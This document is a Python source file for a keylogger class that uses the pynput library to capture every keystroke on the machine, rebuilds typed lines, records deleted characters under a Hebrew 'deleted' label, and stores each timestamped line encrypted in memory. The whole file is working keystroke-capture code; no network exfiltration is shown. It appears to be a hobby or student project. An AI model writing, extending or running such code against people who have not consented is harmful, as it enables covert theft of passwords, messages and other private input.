from pynput import keyboard
from datetime import datetime
from encryptor import Encryptor

class KeyloggerService:
    def __init__(self):
        self.current_line = ""
        self.current_word = ""
        self.logged_lines = []
        self.listener = None
        self.backspace_count = 0
        self.backspace_active = False

    # -------------------- START/STOP --------------------
    def start_logging(self):
        if self.listener and self.listener.running:
            return
        self.listener = keyboard.Listener(
            on_press=self._on_press
        )
        self.listener.start()

    def stop_logging(self):
        if self.listener and self.listener.running:
            self.listener.stop()
        if self.backspace_active:
            self._apply_backspace()
        if self.current_word:
            self.current_line += self.current_word
            self.current_word = ""
        if self.current_line.strip():
            self._log_current_line()
            self.current_line = ""

    # -------------------- KEY HANDLING --------------------
    def _on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "<backspace>"
            else:
                char = None

        if char == "<backspace>":
            self.backspace_count += 1
            self.backspace_active = True
        else:
            if self.backspace_active:
                self._apply_backspace()
            self.backspace_active = False
            self.backspace_count = 0

            if char is not None:
                self._handle_char(char)


    # -------------------- CHARACTER HANDLING --------------------
    def _handle_char(self, char):
        if char == " ":
            self.current_line += self.current_word + " "
            self.current_word = ""
        elif char == "\n":
            if self.current_word:
                self.current_line += self.current_word
                self.current_word = ""
            if self.current_line.strip():
                self._log_current_line()
            self.current_line = ""
        else:
            self.current_word += char

    # -------------------- BACKSPACE --------------------
    def _apply_backspace(self):
        count = self.backspace_count
        removed = ""
        for _ in range(count):
            if self.current_word:
                removed += self.current_word[-1]
                self.current_word = self.current_word[:-1]
            elif self.current_line:
                removed += self.current_line[-1]
                self.current_line = self.current_line[:-1]
        if removed:
            removed = removed[::-1]
            self.current_line = self.current_line.rstrip()
            self.current_line += f" (נמחק: {removed}) "
        self.backspace_count = 0

    # -------------------- LOGGING --------------------
    def _log_current_line(self):
        timestamp = datetime.now().strftime("%H:%M")
        log_line = f"{timestamp} | {self.current_line.strip()}"
        encrypted_log = Encryptor.encrypt(log_line)
        self.logged_lines.append(encrypted_log)

    # -------------------- GET LOG --------------------
    def get_logged_lines(self):
        return self.logged_lines
